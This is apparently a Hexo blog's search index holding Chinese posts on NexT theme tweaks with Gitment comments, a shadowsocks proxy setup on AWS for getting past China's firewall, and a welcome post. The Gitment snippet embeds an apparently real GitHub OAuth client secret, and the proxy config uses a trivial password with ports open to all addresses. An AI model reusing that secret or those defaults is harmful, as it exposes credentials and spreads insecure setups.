代码块样式Markdown格式中``中间的代码如果想自定义格式，可惜通过修改css文件更改配色： 12345678文件路径: /themes/next/source/css/_custom/custom.styl// Custom styles.code &#123; color: #ce0c3d; background: #f9f2f4; margin: 2px;&#125; 阅读全文/Read more第一种方式使用theme的_config.yml中提供的摘要： 123auto_excerpt: enable: true length: 150 设定摘要的长度，这种方式不推荐另一种方式，在Post中要显示的部分之后加&lt;!--more--&gt;，之前的部分就会在首页以摘要方式显示，而且可以确保格式正确。推荐 首页图片显示你会发现在Post中使用[Description](url)这种方式引用的图片在首页预览摘要中看不到，其原因是由于引用路径的问题，具体可以看这里资源引用，使用相对路径引用标签插件。 1&#123;% asset_img example.jpg This is an example image %&#125; 图片居中修改生成css样式即可 123文件路径： /themes/next/source/css/_schemes/Mist/_posts-expanded.styl.post-body img &#123; margin: 0 auto; &#125; Gitment评论Gitment是一个基于github issues的评论框架，最主要的支持Markdown！！ 感动哭，现在写东西除了md格式基本都不会了。Gitment基本思想是调用github Issues，每一篇文章对应一个open的issue,所有comments都其实是在issues上存储的，然后进行显示。首先在 https://github.com/settings/applications/new 中注册一个OAuth application，会生成clinent id和client secret，之后有用。 在next文件中添加如下内容： 123456789101112131415161718192021文件路径: /themes/next/layout/_partials/comments.swig &#123;# gitment #&#125; &#123;% elseif theme.gitment %&#125; &lt;link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"&gt; &lt;script src="https://imsun.github.io/gitment/dist/gitment.browser.js"&gt;&lt;/script&gt; &lt;script&gt; var gitment = new Gitment(&#123; // 根据文章标题设置唯一评论id // id: '&#123;&#123;page.articleID&#125;&#125;', // optional owner: 'emptyxl', repo: 'emptyxl.github.io', oauth: &#123; client_id: 'fa7413e3c0207a96ae03', client_secret: 'a599fef18d25ba5c813d2e437260892e146462a2', &#125; &#125;) gitment.render('comments') &lt;/script&gt; 其中第3、4行是引用资源文件，直接使用官方仓库里的可以保持最新版。之后的script里的为配置内容，需要填写： 12345id 默认值为location.href 即链接的地址，id值即为创建的issue的名称 推荐不用写owner 仓库所有者repo 仓库名 即这些评论(也就是这些issues)放在哪个仓库下client_id 之前注册的OAuth App `client ID`cliend_secret 之前注册的OAuth App `client Secret` 部署之后，使用Owner账号登陆即可进行初始化。]]></content>
      <categories>
        <category>web development</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用shadowsocks搭建个人代理实现科学上网]]></title>
    <url>%2Fblog%2Fshadowsocks%2F</url>
    <content type="text"><![CDATA[Github、Google、StackOverflow访问慢还怎么干活😞 概述 本文首先简短的介绍了”墙”是什么以及shadowsocks的工作原理，让读者对于为什么翻墙以及如何翻墙有个基础的了解。之后对于shadowsocks(之后简称ss)的服务器端与客户端的配置提供了较为详细的配置步骤。在VPS(虚拟专用服务器)的选择上，这里采用了AWS(Amazon Web Services)，对于新用户可以免费使用一年，网速经测试youtube720p没有问题，对于网速及机房位置要求较高的用户可使用AWS付费服务器或者推荐两个VPS提供商:Vultr、BandwagonHost(其官网G20期间被墙了，提供一个官网备份网址)。 GFW GFW(防火长城)也称中国国家防火墙,就是我们俗称的”墙”。GFW的作用主要是政府爸爸用于监管不当言论以及防止网络危害，以达到自我审查、全面监控的作用。GFW封锁网络常见的几种方法: DNS劫持当你访问不被允许的域名时，你ISP(互联网服务供应商)提供的DNS服务器将返回一个不正确的IP地址或不返回。 DNS污染由于DNS劫持可以通过修改域名解析服务器的方式解决，所以系统需要使用DNS污染来封锁一些域名，在直接访问国外DNS服务器的时候，也会被GFW实施DNS污染。 IP封锁IP封锁指的是国内把国外服务器的IP加入了系统的黑名单，导致大部分地区甚至全国无法直接访问服务器。由于系统是分布式的，所以有可能出现部分地区可以访问，部分地区不能访问的情况。这也是为什么我们通过修改hosts文件可以翻墙但经过一段时间之后又无效的原因。 服务器防火墙IP过滤和服务器宕机这两种情况的对外表现是一样的，IP封锁的最后一个可达IP是中国的，而服务器防火墙IP过滤和服务器当机时的最后一个可达IP却是国外的。 基于关键词的TCP连接重置由于http协议是明文，我们通过http协议访问国外网站时都会有记录，如果出现某些敏感关键词时，便会强制断开TCP连接。 无状态的TCP连接重置、SSL证书过滤、SSL劫持、HTTP会话劫持等在此不再赘述，有兴趣的自行google。 shadowsocks 由于我们可以通过境外代理的方式绕过GFW的过滤，通过加密数据使得GFW无法进行内容解析，从而避免被屏蔽的问题。shadowsocks将SSH创建的Sock5协议拆成server和client两个端，shadowsocks-local一般由本机或者路由器，不经过GFW，所以避免了GFW通过特征分析进行干扰。 shadowsocks的客户端可以在这里下载，根据自己系统自行选择：下载地址 shadowsocks server配置 1.创建 在服务器选择上，这里选择了AWS(Amazon Web Services)，其提供一年免费使用时间，可供小白进行实验，配置成功后在使用过程中对硬件与网速不满意的可在自行根据需求购买，推荐两个VPS：Vultr、BandwagonHost。AWS注册在这里不在详述(你要连注册都不会就真的没救了)。注册过程中绑定信用卡/借记卡时可能会扣1-2美元的预授费。注册成功进入之后，在顶部栏服务中选择EC2,右边的机房地址自行选择，这里国内用的话推荐东京，速度还不错，100ping左右。 依次选择: 启动实例———&gt;Amazon-linux-AMI——&gt;实例类型选择默认免费套餐——&gt;审核和启动 核查实例启动这里直接点启动，安全组配置之后在设置。启动时，会让选择现有密钥对或创建新密钥对，这里由于第一次，选择创建新的，名称自己填，然后点下载，会下载your_name.pem的一个文件，记得存好。之后点启动。 2.连接 由于chrome已弃用 NPAPI 无法从浏览器直接连到SSH客户端，所以需要使用独立SSH客户端，这里使用PuTTY进行连接，下载页面已给。由于PuTTY无法识别私钥.pem格式，所以首先需使用PuTTYgen进行转换格式，并使用PuTTY进行连接，具体的文档可以参考这里，说的很详细，不再啰嗦。配置好之后记得save下，以便下次快速使用。连接成功后如下图。 3.配置 首先是ss的安装，可直接使用pip安装1pip install shadowsocks 使用vim编辑ss配置文件。vim基本操作如下： 命令 解释 Esc 进入命令模式 :wq 保存并退出 :wq test.txt 保存并退出，文件名为test.txt :q! 强制退出 i/Ins 进入编辑模式 使用vim编辑文档后，输入以下内容，并保存为json格式文件12345678&#123; "server":"VPS的IP地址", #注意这里填私有IP地址，因为其系统并不能够识别到自身的公网IP地址 "server_port":8388, #服务器端口，最好大于5000，如何在启动服务时发现address can not access，可能是端口已被使用的原因 "local_port":1080, "password":"1234567890", #认证密码 "timeout":300, "method":"aes-256-cfb" #加密方式，推荐使用aes-256-cfb&#125; 这里我将配置保存为ss-config-tokyo.json,然后根据配置文件启动ss：1ssserver -c ss-config-tokyo.json -d start 这样会在后台启动运行shadowsocks,若需要停止，可以输入1ssserver -d stop server的log日志在/var/log/shadowsocks.log中，可以使用cat进行查看，若想在前台运行并观察实时日志，可以使用:1ssserver -c ss-config-tokyo.json 由于AWS默认只允许20端口的SSH协议访问，所以还需修改其安全组策略，允许Sock5(TCP)协议的访问。若想ping通服务器查看延时，还需添加ICMP的权限。在其实例的安全组入站规则中，添加如下规则： 类型 协议 端口范围 来源 自定义TCP规则 TCP 8388 0.0.0.0/0 所有ICMP ICMP 0-65535 0.0.0.0/0 ICMP规则建议在测试完ping之后就删除掉。 Shadowsocks Client 配置 打开软件并如下配置,服务器IP填服务器的公网IP地址: 右键小图标可以看到其提供的内容，如下图。PAC指根据规则表中的内容，值为1的进行代理，表中没有的则不进行代理。全局模式是所有访问的网址均需要代理。服务器里可以根据不同的服务器地址进行切换，我们可以在不同地域的实例创建多个服务器，以供选择。 浏览器配置 Chrome等浏览器需使用插件使其指向本地代理即可完成翻墙。chrome下推荐SwitchyOmega 插件，这里可以下载。下载安装后将其选为系统代理即可。]]></content>
      <categories>
        <category>development</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Welcome to Empty_xL Blog]]></title>
    <url>%2Fblog%2Fhello-2017%2F</url>
    <content type="text"><![CDATA[“Yeah It’s on. ” 作为一个半路出家会一点前端的人，也算终于开通了这个博客。 2017 年，终于不用忍受CSDN坑爹的服务器了，动不动就挂了，最主要还要审核！年纪大了，记性不好，现在也算有个地方记录我研究过的东西了。嗯，不为什么，只为了帮我回忆做过的东西。 在这里的东西我会写的尽可能详细一些，所涉及的基本常识也会介绍一下，毕竟和我一样看到教程都不一定搞得定的小白还是很多的，很多文章省略了比较基础的东西，而这些基础对于一个不长在这个领域中学习的人来说还是需要花费一点精力才能弄明白，所以我会尽可能的详细记录每一步。 搭建这个博客的细节及相关配置在这里 hexo搭建博客的相关内容及配置 选择的是 Hexo + GitHub Pages + Coding.net Pages 快速搭建方式，Hexo指令、模板简单、主题丰富，稍微有点前端基础的都能完成。 目前主要从事安全相关，专注python。empty_xl2017.1.15]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
</search>
